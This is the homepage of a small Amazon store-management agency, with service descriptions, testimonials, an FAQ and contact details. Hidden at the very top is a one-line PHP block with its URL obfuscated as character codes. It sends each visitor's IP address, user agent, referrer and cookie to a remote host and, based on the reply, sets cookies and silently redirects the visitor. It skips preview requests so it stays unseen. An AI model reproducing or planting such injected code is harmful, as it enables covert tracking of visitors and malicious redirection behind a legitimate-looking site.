<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "490649";$uid="q9nzs0n2w5b2fo1flprrvbqg3";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>


<!DOCTYPE html>
<html  >
<head>
  
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <link rel="shortcut icon" href="assets/images/unnamed-100x100.jpg" type="image/x-icon">
  <meta name="description" content="">
  
  
  <title>Home</title>
  <link rel="stylesheet" href="assets/web/assets/mobirise-icons/mobirise-icons.css">
  <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
  <link rel="stylesheet" href="assets/parallax/jarallax.css">
  <link rel="stylesheet" href="assets/popup-overlay-plugin/style.css">
  <link rel="stylesheet" href="assets/dropdown/css/style.css">
  <link rel="stylesheet" href="assets/socicon/css/styles.css">
  <link rel="stylesheet" href="assets/theme/css/style.css">
  <link rel="stylesheet" href="assets/recaptcha.css">
  <link rel="preload" href="https://fonts.googleapis.com/css2?family=Tilt+Warp&display=swap&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Tilt+Warp&display=swap&display=swap"></noscript>
  <link rel="preload" href="https://fonts.googleapis.com/css2?family=Golos+Text:wght@400;700&display=swap&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Golos+Text:wght@400;700&display=swap&display=swap"></noscript>
  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css?v=uCc6In"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css?v=uCc6In" type="text/css">

  
  
  
</head>
<body>
  
  <section data-bs-version="5.1" class="menu menu1 gamem5 cid-uv36W8ziRR" once="menu" id="menu1-0">

    

    <nav class="navbar navbar-dropdown navbar-expand-lg">
        <div class="menu_box container-fluid">
            <div class="navbar-brand d-flex">
                <span class="navbar-logo">
                    <a href="index.html">
                        <img src="assets/images/unnamed-100x100.jpg" alt="">
                    </a>
                </span>
                <span class="navbar-caption-wrap"><a class="navbar-caption text-primary display-5" href="index.html">Amazing Pro Services
                    </a></span>
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-bs-toggle="collapse" data-target="#navbarSupportedContent" data-bs-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
                    <div class="hamburger">
                        <span></span>
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>
                </button>
            </div>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav nav-dropdown" data-app-modern-menu="true"><li class="nav-item"><a class="nav-link link text-primary display-4" href="index.html">Home</a></li>
                    <li class="nav-item"><a class="nav-link link text-primary display-4" href="doing.html">What are we doing</a></li>
                    <li class="nav-item"><a class="nav-link link text-primary display-4" href="services.html">Services</a></li>
                    
                    <li class="nav-item"><a class="nav-link link text-primary display-4" href="index.html#acontact1-7">CONTACTS</a></li></ul>
                

                <div class="mbr-section-btn-main" role="tablist"><a class="btn btn-primary-outline display-4" href="index.html#acontact1-7">
                        BUY NOW
                    </a></div>
            </div>
            
        </div>
    </nav>
</section>

<section data-bs-version="5.1" class="header1 gamem5 cid-uv36XfSpC9" id="header1-1">

    

    <div class="container-fluid">
        
        <div class="mbr-overlay" style="opacity: 0.1; background-color: rgb(202, 202, 202);">
        </div>
        <div class="row">
            <div class="col-12">
                <div class="title-wrapper">
                    <h1 class="mbr-section-title mbr-fonts-style display-1"><strong>Your trusted partner for <br>Amazon store setup and <br>management.</strong></h1>
                    <p class="mbr-text mbr-fonts-style display-7">At Amazing Pro Services, we specialize in Amazon store setup and management, <br>helping businesses thrive in the competitive e-commerce landscape. <br>Our expert team ensures your Amazon store is optimized for success.</p>
                    <div class="mbr-section-btn"><a class="btn btn-primary-outline display-4" href="index.html#acontact1-7">
                            VIEW MORE
                        </a></div>
                </div>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="content3 gamem5 cid-uv36ZrFxXG" id="content3-2">

    

    
    

    <div class="container-fluid">
        <div class="row">
            <div class="col-12 col-lg-6 card">
                <div class="image-wrapper">
                    <img src="assets/images/5cf7681b2500002e0adbee1a-1495x998.jpg" alt="">
                </div>
            </div>
            <div class="col-12 col-lg-6 card">
                <div class="title-wrapper">
                    <div class="title-wrap">
                        <h2 class="mbr-section-title mbr-fonts-style display-2">About us</h2>
                        <p class="mbr-text mbr-fonts-style display-7">Amazing Pro Services was founded with the mission to help businesses succeed on Amazon. Our team of experienced professionals is dedicated to providing top-notch Amazon store setup and management services. We understand the unique challenges and opportunities that come with selling on Amazon, and we are committed to helping our clients achieve their goals.
<br>
<br>Our journey began with a passion for e-commerce and a deep understanding of the Amazon marketplace. Over the years, we have honed our skills and developed innovative strategies to help businesses maximize their potential on Amazon. Whether you are a new seller looking to set up your Amazon store or an established business aiming to optimize your Amazon store management, we have the expertise to guide you to success.<br><br>We specialize in setting up and manage amazon stores. We help business list their products on amazon and drive sale from their amazon store.<br></p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="content8 gamem5 cid-uv37spPes7 mbr-parallax-background" id="content8-8">

    

    
    <div class="mbr-overlay" style="opacity: 0.5; background-color: rgb(0, 0, 0);">
    </div>

    <div class="container-fluid">
        <div class="row">
            <div class="col-12 col-lg-6">
                <div class="image-wrapper">
                    <img src="assets/images/adobestock-136592548-a-resize-scaled-1805x1204.jpg" alt="">
                </div>
            </div>
            <div class="col-12 col-lg-6">
                <div class="title-wrapper">
                    <div class="title-wrap">
                        
                        <h2 class="mbr-section-title mbr-fonts-style display-2">4 advantages of the company</h2>
                        <p class="mbr-text mbr-fonts-style display-7">Expertise in Amazon Store Setup and Management
<br>Our team of experts has years of experience in Amazon store setup and management. We stay up-to-date with the latest trends and best practices to ensure that your store is optimized for success. Our expertise allows us to provide tailored solutions that meet your specific business needs.With our deep understanding of the Amazon marketplace, we can help you navigate the complexities of selling on Amazon and achieve your business goals. Our proven strategies and innovative approaches set us apart from the competition.
<br>
<br>Personalized Service
<br>At Amazing Pro Services, we believe in providing personalized service to each of our clients. We take the time to understand your business goals, target audience, and unique challenges. This allows us to create customized solutions that align with your objectives.Our personalized approach ensures that you receive the attention and support you need to succeed on Amazon. We are committed to building long-term relationships with our clients and helping them achieve sustained growth.
<br>
<br>Data-Driven Strategies
<br>We use data-driven strategies to optimize your Amazon store and maximize your return on investment. Our team analyzes your sales data, customer behavior, and market trends to identify the most effective strategies for growth.By leveraging data and analytics, we can provide insights and recommendations that help you make informed decisions. Our data-driven approach ensures that your Amazon store is always performing at its best.
<br>
<br>Comprehensive Support
<br>We offer comprehensive support to help you manage every aspect of your Amazon store. From Amazon store setup to ongoing management and advertising, we have the expertise to guide you through every step of the process.Our comprehensive support ensures that you have the tools and resources you need to succeed on Amazon. We are committed to helping you achieve your business goals and providing exceptional service every step of the way.</p>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="slider3 mbr-embla gamem5 cid-uv372oMQFl" id="slider3-3">

    

    
    

    <div class="container-fluid">
        <div class="row">
            <div class="col-12 position-relative">
                <div class="embla" data-skip-snaps="true" data-align="center" data-contain-scroll="trimSnaps" data-loop="true" data-auto-play-interval="5" data-draggable="true">
                    <div class="embla__viewport">
                        <div class="embla__container">
                            <div class="embla__slide slider-image item" style="margin-left: 3rem; margin-right: 3rem;">
                                <div class="card-wrap">
                                    <div class="content-wrap">
                                        <div class="icon-wrapper">
                                            <span class="mbr-iconfont mobi-mbri-quote-left mobi-mbri"></span>
                                        </div>
                                        <p class="card-text mbr-fonts-style display-7">"As a new seller on Amazon, we were overwhelmed by the complexities of Amazon store setup and management. <br>The team at Amazing Pro Services provided expert guidance and support, helping us launch our store with confidence. <br>We are grateful for their help."</p>
                                        <p class="mbr-name mbr-fonts-style display-5">
                                            VICKIE RAY
                                        </p>
                                        
                                    </div>
                                </div>
                            </div>
                            <div class="embla__slide slider-image item" style="margin-left: 3rem; margin-right: 3rem;">
                                <div class="card-wrap">
                                    <div class="content-wrap">
                                        <div class="icon-wrapper">
                                            <span class="mbr-iconfont mobi-mbri-quote-left mobi-mbri"></span>
                                        </div>
                                        <p class="card-text mbr-fonts-style display-7">"Amazing Pro Services has been an invaluable partner in our Amazon journey. <br>Their comprehensive support and advanced strategies have helped us optimize our <br>Amazon storemanagement and achieve our business goals. <br>We highly recommend their services."</p>
                                        <p class="mbr-name mbr-fonts-style display-5">
                                            RACHEL WEBER
                                        </p>
                                        
                                    </div>
                                </div>
                            </div>
                            <div class="embla__slide slider-image item" style="margin-left: 3rem; margin-right: 3rem;">
                                <div class="card-wrap">
                                    <div class="content-wrap">
                                        <div class="icon-wrapper">
                                            <span class="mbr-iconfont mobi-mbri-quote-left mobi-mbri"></span>
                                        </div>
                                        <p class="card-text mbr-fonts-style display-7">"The team at Amazing Pro Services provided expert guidance <br>and support, helping us launch our store with confidence."</p>
                                        <p class="mbr-name mbr-fonts-style display-5">
                                            MICHAEL HOPKINS
                                        </p>
                                        
                                    </div>
                                </div>
                            </div>
                            <div class="embla__slide slider-image item" style="margin-left: 3rem; margin-right: 3rem;">
                                <div class="card-wrap">
                                    <div class="content-wrap">
                                        <div class="icon-wrapper">
                                            <span class="mbr-iconfont mobi-mbri-quote-left mobi-mbri"></span>
                                        </div>
                                        <p class="card-text mbr-fonts-style display-7">"The team at Amazing Pro Services provided exceptional service for our Amazon store setup and management. <br>Their expertise and personalized approach helped us launch our store successfully and attract our first customers. <br>We highly recommend their services."</p>
                                        <p class="mbr-name mbr-fonts-style display-5">
                                            PETER MITCHELL
                                        </p>
                                        
                                    </div>
                                </div>
                            </div>
                            <div class="embla__slide slider-image item" style="margin-left: 3rem; margin-right: 3rem;">
                                <div class="card-wrap">
                                    <div class="content-wrap">
                                        <div class="icon-wrapper">
                                            <span class="mbr-iconfont mobi-mbri-quote-left mobi-mbri"></span>
                                        </div>
                                        <p class="card-text mbr-fonts-style display-7">"Working with Amazing Pro Services has been a game-changer for our business. <br>Their data-driven strategies have helped us optimize our Amazon store and achieve significant growth. <br>We are impressed with their comprehensive support and commitment to our success."</p>
                                        <p class="mbr-name mbr-fonts-style display-5">
                                            DANIEL MATHIS
                                        </p>
                                        
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <button class="embla__button embla__button--prev">
                        <span class="mobi-mbri mobi-mbri-arrow-prev mbr-iconfont" aria-hidden="true"></span>
                        <span class="sr-only visually-hidden visually-hidden">Previous</span>
                    </button>
                    <button class="embla__button embla__button--next">
                        <span class="mobi-mbri mobi-mbri-arrow-next mbr-iconfont" aria-hidden="true"></span>
                        <span class="sr-only visually-hidden visually-hidden">Next</span>
                    </button>
                </div>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="tabs2 gamem5 cid-uv377mevFF mbr-parallax-background" id="tabs2-5">

    

    
    <div class="mbr-overlay" style="opacity: 0.9; background-color: rgb(0, 0, 0);">
    </div>

    <div class="container-fluid">
        <div class="row">
            <div class="col-12 col-lg-6">
                <div class="title-wrapper">
                    
                    <h2 class="mbr-section-title mbr-fonts-style display-2">Tips from the company</h2>
                </div>
                <ul class="nav nav-tabs" role="tablist">
                    <li class="nav-item first mbr-fonts-style"><a class="nav-link mbr-fonts-style show active display-4" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs2-5_tab0" aria-selected="true">
                            Optimizing Your <br>AmazonProduct <br>Listings
                        </a></li>
                    <li class="nav-item"><a class="nav-link mbr-fonts-style active display-4" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs2-5_tab1" aria-selected="true">
                            Leveraging Amazon <br>Advertising
                        </a></li>
                    <li class="nav-item"><a class="nav-link mbr-fonts-style active display-4" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs2-5_tab2" aria-selected="true">
                            Managing Customer <br>Reviews
                        </a></li>
                    
                    
                </ul>
                <div class="tab-content">
                    <div id="tab1" class="tab-pane in active" role="tabpanel">
                        <div class="text-wrapper">
                            <p class="mbr-text mbr-fonts-style display-7">
                                One of the most crucial aspects of Amazon store setup and management is optimizing your product listings. This involves using relevant keywords, high-quality images, and compelling product descriptions. By optimizing your listings, you can improve your visibility on Amazon and attract more potential customers.
                            </p>
                        </div>
                    </div>
                    <div id="tab2" class="tab-pane" role="tabpanel">
                        <div class="text-wrapper">
                            <p class="mbr-text mbr-fonts-style display-7">
                                Amazon advertising can be a powerful tool for driving traffic to your store and increasing sales. By leveraging Amazon's advertising platform, you can target specific keywords and demographics to reach your ideal customers. Our team of experts can help you create and manage effective advertising campaigns that maximize your return on investment.
                            </p>
                        </div>
                    </div>
                    <div id="tab3" class="tab-pane" role="tabpanel">
                        <div class="text-wrapper">
                            <p class="mbr-text mbr-fonts-style display-7">
                                Customer reviews play a significant role in the success of your Amazon store. Positive reviews can boost your credibility and encourage more customers to make a purchase. It's important to actively manage your customer reviews by responding to feedback and addressing any concerns promptly.
                            </p>
                        </div>
                    </div>
                    
                    
                </div>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="content4 gamem5 cid-uv375NkfPu" id="content4-4">

    

    
    

    <div class="container-fluid">
        <div class="row">
            <div class="col-12 col-lg-7">
                <div id="bootstrap-accordion_4" class="panel-group accordionStyles accordion" role="tablist" aria-multiselectable="true">
                    <div class="card">
                        <div class="card-header" role="tab" id="headingOne">
                            <a role="button" class="panel-title collapsed" data-toggle="collapse" data-bs-toggle="collapse" data-core="" href="#collapse1_4" aria-expanded="false" aria-controls="collapse1">
                                <h3 class="panel-title-edit mbr-fonts-style display-5"><strong>How do I get started with Amazon store setup?</strong></h3>
                                <span class="sign mbr-iconfont mobi-mbri-arrow-down mobi-mbri"></span>
                            </a>
                        </div>
                        <div id="collapse1_4" class="panel-collapse noScroll collapse" role="tabpanel" aria-labelledby="headingOne" data-parent="#accordion" data-bs-parent="#bootstrap-accordion_4">
                            <div class="panel-body">
                                <p class="mbr-fonts-style panel-text display-7">
                                    Getting started with Amazon store setup is easy with Amazing Pro Services. Simply contact our team, and we will guide you through the process of creating your seller account, setting up your product listings, and optimizing your storefront. We provide personalized support to ensure that your store is set up for success.
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-header" role="tab" id="headingTwo">
                            <a role="button" class="panel-title collapsed" data-toggle="collapse" data-bs-toggle="collapse" data-core="" href="#collapse2_4" aria-expanded="false" aria-controls="collapse2">
                                <h3 class="panel-title-edit mbr-fonts-style display-5"><strong>What services do you offer for Amazon store management?</strong></h3>
                                <span class="sign mbr-iconfont mobi-mbri-arrow-down mobi-mbri"></span>
                            </a>
                        </div>
                        <div id="collapse2_4" class="panel-collapse noScroll collapse" role="tabpanel" aria-labelledby="headingTwo" data-parent="#accordion" data-bs-parent="#bootstrap-accordion_4">
                            <div class="panel-body">
                                <p class="mbr-fonts-style panel-text display-7">
                                    We offer a comprehensive range of Amazon store management services, including inventory management, pricing strategies, customer service, and advertising and marketing. Our team of experts provides ongoing support to help you optimize your store's performance and achieve your business goals.
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-header" role="tab" id="headingThree">
                            <a role="button" class="panel-title collapsed" data-toggle="collapse" data-bs-toggle="collapse" data-core="" href="#collapse3_4" aria-expanded="false" aria-controls="collapse3">
                                <h3 class="panel-title-edit mbr-fonts-style display-5"><strong>How can I optimize my Amazon product listings?</strong></h3>
                                <span class="sign mbr-iconfont mobi-mbri-arrow-down mobi-mbri"></span>
                            </a>
                        </div>
                        <div id="collapse3_4" class="panel-collapse noScroll collapse" role="tabpanel" aria-labelledby="headingThree" data-parent="#accordion" data-bs-parent="#bootstrap-accordion_4">
                            <div class="panel-body">
                                <p class="mbr-fonts-style panel-text display-7">
                                    Optimizing your Amazon product listings involves using relevant keywords, high-quality images, and compelling product descriptions. Our team of experts can help you with keyword research, image optimization, and creating compelling ad copy to improve your visibility on Amazon and attract more customers.
                                </p>
                            </div>
                        </div>
                    </div>
                    
                    
                    
                </div>
            </div>
            <div class="col-12 col-lg-5">
                <div class="image-wrapper">
                    <img src="assets/images/i-6.webp" alt="">
                </div>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="form1 gamem5 cid-uv45eDMO1r" id="form1-n">

    

    
    

    <div class="container-fluid">
        <div class="row flex-row-reverse">
            <div class="col-12 col-lg-6">
                
                
            </div>
            <div class="col-12 col-lg-6 mx-auto mbr-form" data-form-type="formoid">
                <form method="POST" class="mbr-form form-with-styler" data-form-title="Form Name"><input type="hidden" name="email" data-form-email="true" value="IZkWDbL5cpq26o016vavM1GwdX34TbCondFcoq3Fs/BEKbNq/mF4/04u/G9wJwZRPU0tos+6O7tFintELCGZe873WVvOO7Vb3U09wUKqYYW9VKSG+/e+tfCjsC23AGlu.GHKEVf8cxP9Rhiuq7p1h7Rof8xTTRAPj4ID9FEdgSp8VCgeWPlgyahnhySZRQ+/GrzwsQpdLq5u3V87QbMhJubBZrtHwCIN2mztLCek57eG2WO7ck1uTAjpt9tewu/Kr.P6FNSmlwRZr4nKVX3K/EER9TRb5U2Jb8A+Q13WMm7kOEDS5fI1xqQmONrOuuyEXeXdt+te9c05SQSe44z5fR+e275kMyceVd0C3mtJE1Ts6EjDZK4ABBBlrbAseIL5PB">
                    <div class="row">
                        <div hidden="hidden" data-form-alert="" class="alert alert-success col-12">Thanks for filling
                            out the form!</div>
                        <div hidden="hidden" data-form-alert-danger="" class="alert alert-danger col-12"> Oops...! some
                            problem!
                        </div>
                    </div>
                    <div class="dragArea row">
                        <div class="col-lg-12 col-md-12 col-sm-12 form-group mb-3" data-for="name">
                            <input type="text" name="name" placeholder="Your name..." data-form-field="name" class="form-control display-7" value="" id="name-form1-n">
                        </div>
                        <div class="col-lg-12 col-md-12 col-sm-12 form-group mb-3" data-for="email">
                            <input type="email" name="email" placeholder="Your email..." data-form-field="email" class="form-control display-7" value="" id="email-form1-n">
                        </div>
                        <div class="col-lg-12 col-md-12 col-sm-12 form-group mb-3" data-for="textarea">
                            <textarea name="textarea" placeholder="Your message..." data-form-field="textarea" class="form-control display-7" id="textarea-form1-n"></textarea>
                        </div>
                        <div class="col-lg-12 col-md-12 col-sm-12 mbr-section-btn">
                            <button type="submit" class="btn btn-primary-outline display-4">SEND NOW</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="contact1 homem5 cid-uv37cyeV6S" id="acontact1-7">

    

    
    

    <div class="container-fluid">
        <div class="row align-items-center">
            <div class="col-12 col-lg-12 col-text border-item">
                
                <div class="center-box">
                    <h1 class="mbr-section-title mbr-fonts-style align-center mb-0 display-2">
                        CONTACTS
                    </h1>
                    
                </div>
                <ul class="list mbr-fonts-style display-5">
                    <li class="list-text item-wrap">
                        <a href="tel:+12018549711" class="text-white">+12018549711</a><br><br><br>
                    </li>
                    <li class="list-text item-wrap">6200 Hudson Ave, <br>West New York, <br>NJ 07093&nbsp;</li><li class="list-text item-wrap"><a href="mailto:amazingproservices@gmail.com" class="text-primary" style="font-size: 1.56rem; letter-spacing: 0.06em;">amazingproservices@gmail.com</a><br><br><br></li>
                </ul>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="map1 gamem5 cid-uv37au59eC" id="map1-6">

    

    
    

    <div class="container-fluid">
        <div class="row">
            <div class="col-12">
                <div class="google-map"><iframe frameborder="0" style="border:0" src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d6041.568649683267!2d-74.01149958862348!3d40.78875543906127!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c2580d97f1d7dd%3A0xd7bb69c41f5be0af!2s6200%20Hudson%20Ave%20Apartment%20201%2C%20West%20New%20York%2C%20NJ%2007093!5e0!3m2!1sen!2sus!4v1732465856715!5m2!1sen!2sus" allowfullscreen=""></iframe></div>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="footer4 cid-uv37wTdSTH" once="footers" id="footer04-9">

    

    

    <div class="container">
        <div class="media-container-row align-center mbr-white">
            <div class="col-12">
                <p class="mbr-text mb-0 mbr-fonts-style display-7">
                    © Amazing Pro Services 2024 - All Rights Reserved
                </p>
            </div>
        </div>
    </div>
</section>


<script src="assets/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/parallax/jarallax.js"></script>
  <script src="assets/web/assets/cookies-alert-plugin/cookies-alert-core.js"></script>
  <script src="assets/web/assets/cookies-alert-plugin/cookies-alert-script.js"></script>
  <script src="assets/smoothscroll/smooth-scroll.js"></script>
  <script src="assets/ytplayer/index.js"></script>
  <script src="assets/dropdown/js/navbar-dropdown.js"></script>
  <script src="assets/embla/embla.min.js"></script>
  <script src="assets/embla/script.js"></script>
  <script src="assets/mbr-tabs/mbr-tabs.js"></script>
  <script src="assets/mbr-switch-arrow/mbr-switch-arrow.js"></script>
  <script src="assets/theme/js/script.js"></script>
  <script src="assets/formoid.min.js"></script>
  
  
  
<input name="cookieData" type="hidden" data-cookie-cookiesAlertType='false' data-cookie-customDialogSelector='null' data-cookie-colorText='#424a4d' data-cookie-colorBg='rgb(255, 255, 255)' data-cookie-opacityOverlay='0' data-cookie-bgOpacity='100' data-cookie-textButton='GOT IT' data-cookie-rejectText='REJECT' data-cookie-colorButton='#ffffff' data-cookie-rejectColor='#ffffff' data-cookie-colorLink='#424a4d' data-cookie-underlineLink='true' data-cookie-text="We use cookies to give you the best experience. Read our <a href='privacy.html'>cookie policy</a> and <a href='policy.html'>privacy policy</a>.">
  </body>
</html>